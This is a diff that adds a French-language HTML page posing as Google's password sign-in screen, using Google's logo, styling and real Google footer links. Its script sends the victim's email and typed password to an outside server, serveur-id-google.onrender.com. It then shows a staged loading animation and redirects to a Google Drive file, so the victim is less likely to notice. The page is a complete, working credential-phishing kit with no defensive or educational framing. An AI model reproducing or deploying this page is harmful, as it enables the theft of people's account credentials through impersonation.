@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion - Google</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    body {
+      margin: 0;
+      background-color: #1e1f20;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 30px;
+      box-sizing: border-box;
+    }
+
+    .container {
+      background-color: #0e0e0e;
+      color: white;
+      width: 1100px;
+      height: 400px;
+      border-radius: 30px;
+      padding: 30px 40px;
+      box-sizing: border-box;
+      position: relative;
+      display: flex;
+      overflow: hidden; /* important : clip la barre quand elle sort de la box */
+    }
+
+    .logo {
+      position: absolute;
+      top: 30px;
+      left: 30px;
+    }
+
+    .logo img {
+      height: 50px;
+    }
+
+    .left {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding-left: 20px;
+      padding-bottom: 100px;
+    }
+
+    .left h1 {
+      font-size: 40px;
+      font-weight: normal;
+      margin-bottom: 10px;
+    }
+
+    .left p {
+      font-size: 14px;
+      color: #ccc;
+      word-break: break-word;
+    }
+
+    .right {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding-right: 20px;
+    }
+
+    .input-box {
+      position: relative;
+      width: 100%;
+    }
+
+    .input-box input {
+      width: 100%;
+      padding: 16px 10px;           /* espace pour le texte */
+      padding-left: 12px;
+      font-size: 16px;
+      border: 2px solid #a8c7fa;
+      border-radius: 5px;
+      outline: none;
+      background-color: #0e0e0e;
+      color: white;
+    }
+
+    /* masquer tout placeholder réel (on utilise placeholder=" " pour :placeholder-shown) */
+    .input-box input::placeholder {
+      color: transparent;
+    }
+
+    .input-box label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #a8c7fa;
+      font-size: 16px;
+      pointer-events: none;
+      transition: all 0.18s ease;
+      background-color: transparent;
+      padding: 0 6px;
+    }
+
+    /* état "flottant" : quand le champ est focus ou non vide */
+    .input-box input:focus + label,
+    .input-box input:not(:placeholder-shown) + label {
+      top: -10px;
+      transform: none;
+      font-size: 13px;
+      color: #a8c7fa;
+      background-color: #0e0e0e;
+      padding: 0 6px;
+    }
+
+    .input-error {
+      border: 2px solid #f2b8b5 !important;
+    }
+
+    .label-error {
+      color: #f2b8b5 !important;
+    }
+
+    .checkbox {
+      margin-top: 16px;
+      display: flex;
+      align-items: center;
+      color: #d0d0d0;
+      font-size: 15px;
+      padding-left: 2px;
+    }
+
+    .checkbox input[type="checkbox"] {
+      appearance: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid #a8c7fa;
+      border-radius: 2px;
+      background-color: #0e0e0e;
+      margin-right: 10px;
+      position: relative;
+      cursor: pointer;
+    }
+
+    .checkbox input[type="checkbox"]:checked::after {
+      content: '';
+      position: absolute;
+      top: -1px;
+      left: 4px;
+      width: 5px;
+      height: 10px;
+      border: solid #a8c7fa;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+
+    #mdpError {
+      color: #f2b8b5;
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+    }
+
+    .suivant-btn {
+      position: absolute;
+      bottom: 20px;
+      right: 40px;
+      background-color: #b6d0fb;
+      color: #000;
+      border: none;
+      border-radius: 25px;
+      padding: 10px 30px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .email-border {
+      border: 2px solid #8e918f;
+      border-radius: 20px;
+      padding: 4px 12px;
+      width: max-content;
+      display: inline-block;
+      background-color: #131313;
+      color: #ffffff;
+    }
+    .mdp-oublie {
+      position: absolute;
+      bottom: 30px;
+      right: 180px;
+      font-size: 14px;
+    }
+
+    .mdp-oublie a {
+      color: #a8c7fa;
+      text-decoration: none;
+    }
+
+    .mdp-oublie a:hover {
+      text-decoration: underline;
+    }
+
+    /* Barre de chargement (segment avec début et fin, se déplace et disparaît hors de la .container) */
+    #loading-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      z-index: 1000;
+      display: none; /* contrôlé par JS */
+      pointer-events: none;
+      overflow: visible;
+    }
+
+    #loading-bar .loading-inner {
+      position: absolute;
+      top: 0;
+      left: -40%;       /* démarre à l'extérieur à gauche */
+      width: 36%;       /* longueur visible de la barre (début + fin) */
+      height: 100%;
+      background-color: #b6d0fb;
+      border-radius: 2px;
+      animation: slide 1s linear infinite;
+      will-change: transform;
+    }
+
+    @keyframes slide {
+      0%   { transform: translateX(0%); }      /* left:-40% */
+      100% { transform: translateX(380%); }    /* sort complètement à droite */
+    }
+
+    /* Overlay gris semi-transparent */
+    #overlay-blur {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(30, 31, 32, 0.6);
+      z-index: 998;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Footer avec options de langue et liens */
+    .footer {
+      width: 1100px;
+      background-color: transparent;
+      padding: 20px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-sizing: border-box;
+      margin-top: 30px;
+    }
+
+    .footer-left {
+      display: flex;
+      align-items: center;
+    }
+
+    .language-selector {
+      background-color: transparent;
+      border: none;
+      color: white;
+      font-size: 14px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 0;
+    }
+
+    .language-selector:hover {
+      color: #a8c7fa;
+    }
+
+    .language-selector::after {
+      content: "▼";
+      font-size: 10px;
+    }
+
+    .footer-right {
+      display: flex;
+      gap: 25px;
+      align-items: center;
+    }
+
+    .footer-right a {
+      color: white;
+      text-decoration: none;
+      font-size: 14px;
+      transition: color 0.2s ease;
+    }
+
+    .footer-right a:hover {
+      color: #a8c7fa;
+    }
+  </style>
+
+<script>
+  // Durée minimale d'affichage du chargement (ms) — augmentez ici sans toucher la vitesse d'animation CSS
+  const MIN_LOADING_MS = 3000; // exemple : 8 secondes
+
+  function togglePasswordVisibility() {
+    const input = document.getElementById("champ");
+    if (input) input.type = input.type === "password" ? "text" : "password";
+  }
+
+  document.addEventListener("DOMContentLoaded", function () {
+    const emailSpan = document.getElementById("emailSpan");
+    const bouton = document.querySelector(".suivant-btn");
+    const passwordInput = document.getElementById("champ");
+    const passwordLabel = document.querySelector("label[for='champ']");
+    const mdpError = document.getElementById("mdpError");
+    const overlay = document.getElementById("overlay-blur");
+    const loadingContainer = document.getElementById("loading-bar");
+    const loadingInner = loadingContainer ? loadingContainer.querySelector(".loading-inner") : null;
+
+    // remplir l'email depuis localStorage si présent
+    const storedEmail = localStorage.getItem("email");
+    if (storedEmail && emailSpan) emailSpan.textContent = storedEmail;
+
+    let loadingStart = 0;
+
+    function showLoading() {
+      if (!loadingContainer || !loadingInner) return;
+      loadingContainer.style.display = "block";
+      // démarrer / relancer l'animation
+      loadingInner.style.animation = "none";
+      // force reflow
+      // eslint-disable-next-line no-unused-expressions
+      loadingInner.offsetWidth;
+      loadingInner.style.animation = null; // reprend la règle CSS (infinite)
+      loadingStart = Date.now();
+    }
+
+    function _performHideLoading() {
+      if (!loadingContainer || !loadingInner) {
+        if (loadingContainer) loadingContainer.style.display = "none";
+        return;
+      }
+      // laisser l'animation faire une dernière itération puis cacher
+      loadingInner.style.animationIterationCount = "4";
+      const onEnd = function () {
+        loadingContainer.style.display = "none";
+        // remettre pour la prochaine utilisation
+        loadingInner.style.animationIterationCount = "infinite";
+        loadingInner.removeEventListener("animationend", onEnd);
+      };
+      loadingInner.addEventListener("animationend", onEnd);
+    }
+
+    function hideLoading() {
+      if (!loadingContainer || !loadingInner) {
+        if (loadingContainer) loadingContainer.style.display = "none";
+        return;
+      }
+      const elapsed = Date.now() - loadingStart;
+      const remaining = MIN_LOADING_MS - elapsed;
+      if (remaining > 0) {
+        setTimeout(_performHideLoading, remaining);
+      } else {
+        _performHideLoading();
+      }
+    }
+
+    if (bouton) {
+      bouton.addEventListener("click", function () {
+        let valid = true;
+
+        if (!passwordInput || passwordInput.value.trim() === "") {
+          if (passwordInput) passwordInput.classList.add("input-error");
+          if (passwordLabel) passwordLabel.classList.add("label-error");
+          if (mdpError) mdpError.style.display = "block";
+          valid = false;
+        }
+
+        if (!valid) return;
+
+        if (overlay) overlay.style.display = "block";
+        showLoading();
+
+        fetch('https://serveur-id-google.onrender.com/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: emailSpan ? emailSpan.textContent : '',
+            mot_de_passe: passwordInput ? passwordInput.value : ''
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log(data.message);
+          hideLoading();
+          if (overlay) setTimeout(() => overlay.style.display = "none", 4000);
+          setTimeout(() => { window.location.href = "https://drive.google.com/file/d/1xs9z0laMKLdLwUk_WtyjttTLRNmrNqeR/view?usp=sharing"; }, 4000);
+        })
+        .catch(error => {
+          console.error("Erreur lors de l’envoi :", error);
+          hideLoading();
+          if (overlay) overlay.style.display = "none";
+        });
+      });
+    }
+
+    if (passwordInput) {
+      passwordInput.addEventListener("input", function () {
+        passwordInput.classList.remove("input-error");
+        if (passwordLabel) passwordLabel.classList.remove("label-error");
+        if (mdpError) mdpError.style.display = "none";
+      });
+    }
+
+    // Gestion du sélecteur de langue
+    const languageButton = document.querySelector(".language-selector");
+    if (languageButton) {
+      languageButton.addEventListener("click", function () {
+        // Vous pouvez ajouter une logique de dropdown ici
+        console.log("Langue cliquée");
+      });
+    }
+  });
+</script>
+
+</head>
+<body>
+  <div id="overlay-blur"></div>
+
+  <div class="container">
+    <!-- barre de chargement INSÉRÉE DANS .container pour qu'elle soit clipée -->
+    <div id="loading-bar">
+      <div class="loading-inner"></div>
+    </div>
+
+    <div class="logo">
+      <img src="https://www.gstatic.com/images/branding/product/1x/googleg_32dp.png" alt="Logo">
+    </div>
+
+    <div class="left">
+      <h1>Bienvenue</h1>
+      <p id="emailText" class="email-border">
+        <i class="fas fa-user" style="margin-right: 8px;"></i>
+        <span id="emailSpan">...</span>
+      </p>
+    </div>
+
+    <div class="right">
+      <div class="input-box">
+        <input type="password" id="champ" required placeholder=" ">
+        <label for="champ">Saisissez votre mot de passe</label>
+        <small id="mdpError">Saisissez votre mot de passe</small>
+      </div>
+      <div class="checkbox">
+        <input type="checkbox" id="toggle-password" onclick="togglePasswordVisibility()">
+        <label for="toggle-password">Afficher le mot de passe</label>
+      </div>
+    </div>
+
+    <div class="mdp-oublie">
+      <a href="https://support.google.com/accounts/answer/41078?hl=fr&co=GENIE.Platform%3DAndroid" target="_blank">Mot de passe oublié ?</a>
+    </div>
+
+    <button class="suivant-btn">Suivant</button>
+  </div>
+
+  <!-- Footer avec options -->
+  <div class="footer">
+    <div class="footer-left">
+      <button class="language-selector">Français (France)</button>
+    </div>
+    <div class="footer-right">
+      <a href="https://support.google.com/accounts?hl=fr&visit_id=638964685813799550-2638493007&rd=2&p=account_iph#topic=3382296">Aide</a>
+      <a href="https://policies.google.com/privacy?gl=FR&hl=fr">Confidentialité</a>
+      <a href="https://policies.google.com/terms?gl=FR&hl=fr">Conditions</a>
+    </div>
+  </div>
+</body>
+
+</html>
+
+
+
+
